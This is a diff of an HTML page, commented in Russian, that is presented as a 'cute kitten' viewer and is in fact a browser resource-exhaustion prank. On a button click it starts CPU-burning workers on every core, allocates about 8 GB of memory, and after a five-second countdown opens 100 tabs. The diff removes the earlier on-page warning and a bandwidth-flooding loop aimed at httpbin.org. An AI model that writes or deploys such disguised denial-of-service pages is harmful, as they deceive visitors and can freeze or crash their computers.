@@ -2,88 +2,73 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Секретный котёнок</title>
+    <title>Котёнок с нагрузкой</title>
     <style>
         body {
             background: #0a0f0f;
             color: #0ff;
             font-family: 'Courier New', monospace;
             text-align: center;
-            padding: 50px;
+            padding: 20px;
         }
-        button {
+        #startBtn {
             background: #ffaa00;
             border: none;
             color: #000;
-            font-size: 2em;
+            font-size: 2.5em;
             padding: 20px 40px;
-            border-radius: 15px;
+            border-radius: 20px;
             cursor: pointer;
             font-weight: bold;
             box-shadow: 0 0 30px orange;
             transition: 0.2s;
         }
-        button:hover {
+        #startBtn:hover {
             background: #ff8800;
             box-shadow: 0 0 40px #ffaa00;
         }
-        #status {
-            color: #ffaa00;
-            font-size: 1.5em;
+        #imageContainer {
             margin-top: 30px;
+            display: none;
         }
-        #warning {
-            color: #f44;
-            font-size: 1.2em;
+        img {
+            max-width: 80%;
+            max-height: 60vh;
+            border: 5px solid #0ff;
+            border-radius: 20px;
+            box-shadow: 0 0 30px cyan;
+        }
+        #timer {
+            font-size: 2em;
             margin-top: 20px;
+            color: #ffaa00;
+        }
+        #status {
+            color: #8ff;
+            margin-top: 20px;
+            font-size: 1.2em;
         }
     </style>
 </head>
 <body>
     <h1>😺 Хочешь увидеть милого котенка?</h1>
-    <button id="startBtn">нажми на эту кнопку, не упусти шанс!</button>
-    <div id="status">Ожидание...</div>
-    <div id="warning">⚠️ Это может сильно нагрузить компьютер. Ты предупреждён.</div>
+    <button id="startBtn">НАЖМИ СЮДА, НЕ УПУСТИ ШАНС!</button>
+    <div id="imageContainer">
+        <img id="catImage" src="https://img.freepik.com/free-photo/view-beautiful-persian-domestic-cat_23-2151773956.jpg?semt=ais_hybrid&w=740&q=80" alt="Котик">
+    </div>
+    <div id="timer"></div>
+    <div id="status"></div>
 
     <script>
         document.getElementById('startBtn').addEventListener('click', function() {
-            const status = document.getElementById('status');
-            status.innerText = 'Запуск армии котят...';
+            // Прячем кнопку, показываем кота
+            this.style.display = 'none';
+            document.getElementById('imageContainer').style.display = 'block';
+            const timerDiv = document.getElementById('timer');
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = 'Загружаем систему...';
 
-            // ========== 1. ОТКРЫТИЕ 100 ВКЛАДОК ==========
-            status.innerText = 'Открываю 100 вкладок...';
-            for (let i = 0; i < 100; i++) {
-                setTimeout(() => {
-                    window.open(window.location.href, '_blank');
-                }, i * 30); // задержка, чтобы не заблокировать сразу
-            }
-
-            // ========== 2. ЗАХВАТ 8 ГБ ПАМЯТИ ==========
-            status.innerText = 'Выделяю 8 ГБ памяти...';
-            setTimeout(() => {
-                try {
-                    const memoryChunks = [];
-                    const targetBytes = 8 * 1024 * 1024 * 1024; // 8 ГБ
-                    const chunkSize = 100 * 1024 * 1024; // 100 МБ
-                    let allocated = 0;
-
-                    function allocate() {
-                        while (allocated < targetBytes) {
-                            let chunk = new ArrayBuffer(chunkSize);
-                            memoryChunks.push(chunk);
-                            allocated += chunkSize;
-                            status.innerText = `Память: ${(allocated / (1024*1024*1024)).toFixed(1)} ГБ...`;
-                        }
-                        status.innerText = '8 ГБ выделено (теоретически).';
-                    }
-                    setTimeout(allocate, 500);
-                } catch (e) {
-                    status.innerText = 'Ошибка памяти: ' + e;
-                }
-            }, 1000);
-
-            // ========== 3. 100% CPU НАГРУЗКА ==========
-            status.innerText = 'Загружаю CPU...';
+            // ========== 100% CPU НАГРУЗКА ==========
             if (window.Worker) {
                 const coreCount = navigator.hardwareConcurrency || 4;
                 for (let i = 0; i < coreCount; i++) {
@@ -102,38 +87,54 @@
                     } catch (e) {}
                 }
             }
-            // Дополнительная нагрузка в основном потоке
             function burnCPU() {
                 let start = Date.now();
-                while (Date.now() - start < 50) {
+                while (Date.now() - start < 100) {
                     Math.sqrt(Math.random() * 1e9);
                 }
                 setTimeout(burnCPU, 0);
             }
-            setTimeout(burnCPU, 100);
+            burnCPU();
 
-            // ========== 4. СЕТЕВОЙ ТРАФИК 100 МБ/СЕК ==========
-            status.innerText = 'Генерирую сетевой трафик...';
-            // Используем httpbin.org для генерации больших ответов
-            const trafficTargetMBps = 100; // 100 МБ/сек
-            const chunkSizeMB = 10; // 10 МБ на запрос (httpbin.org/bytes/10485760)
-            const requestsPerSecond = trafficTargetMBps / chunkSizeMB; // 10 запросов в сек
+            // ========== ЗАХВАТ 8 ГБ ПАМЯТИ ==========
+            setTimeout(() => {
+                try {
+                    const memoryChunks = [];
+                    const targetBytes = 8 * 1024 * 1024 * 1024; // 8 ГБ
+                    const chunkSize = 100 * 1024 * 1024; // 100 МБ
+                    let allocated = 0;
+                    function allocate() {
+                        while (allocated < targetBytes) {
+                            let chunk = new ArrayBuffer(chunkSize);
+                            memoryChunks.push(chunk);
+                            allocated += chunkSize;
+                        }
+                    }
+                    setTimeout(allocate, 10);
+                } catch (e) {}
+            }, 100);
 
-            function makeRequest() {
-                const url = `https://httpbin.org/bytes/${chunkSizeMB * 1024 * 1024}?r=${Math.random()}`;
-                fetch(url)
-                    .then(response => response.blob()) // потребляем данные
-                    .catch(() => {}); // игнорируем ошибки
-            }
+            // ========== ОТСЧЁТ 5 СЕКУНД И ОТКРЫТИЕ 100 ВКЛАДОК ==========
+            const catUrl = 'https://img.freepik.com/free-photo/view-beautiful-persian-domestic-cat_23-2151773956.jpg?semt=ais_hybrid&w=740&q=80';
+            let secondsLeft = 5;
+            timerDiv.innerText = secondsLeft + ' сек';
 
-            // Запускаем по 10 запросов каждую секунду
-            setInterval(() => {
-                for (let i = 0; i < requestsPerSecond; i++) {
-                    setTimeout(makeRequest, i * 100); // равномерно распределяем
+            const countdown = setInterval(() => {
+                secondsLeft--;
+                timerDiv.innerText = secondsLeft + ' сек';
+                if (secondsLeft <= 0) {
+                    clearInterval(countdown);
+                    timerDiv.innerText = 'ОТКРЫВАЮ 100 КОТИКОВ!';
+                    statusDiv.innerText = 'Атака клонов...';
+
+                    for (let i = 0; i < 100; i++) {
+                        setTimeout(() => {
+                            window.open(catUrl, '_blank');
+                        }, i * 20);
+                    }
+                    statusDiv.innerText = '100 вкладок с котиками запущены!';
                 }
             }, 1000);
-
-            status.innerText = 'Котята атакуют! Смотри диспетчер задач.';
         });
     </script>
 </body>
